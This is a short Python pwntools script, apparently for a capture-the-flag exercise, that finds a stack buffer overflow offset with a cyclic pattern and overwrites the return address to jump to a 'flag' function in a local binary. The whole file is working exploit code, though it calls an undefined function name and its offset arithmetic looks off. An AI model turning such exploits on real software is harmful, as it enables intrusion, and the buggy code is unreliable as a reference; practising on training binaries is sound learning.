from pwn import *

def get_offset(file_path, elf):
    p = process(file_path)
    p.sendline(cyclic(200, n=8))
    p.wait()

    core = p.corefile

    if elf.bits==32:
        offset = cyclic_find(core.read(core.esp, 8), n=8) - 4
    else:
        offset = cyclic_find(core.read(core.rsp, 8), n=8) - 4

    return offset

def local_ret2win(file_path, fun_name):
    elf = ELF(file_path)

    offset = get_offset(file_path, elf)

    p = process(file_path)
    payload = b'A'*offset
    if elf.bits == 32:
        payload += p32(elf.symbols[fun_name])
    else:
        payload += p64(elf.symbols[fun_name])
    log.info(p.clean())         
    p.sendline(payload)

    log.info(p.clean())

ret2win('./ret2win/vuln', 'flag')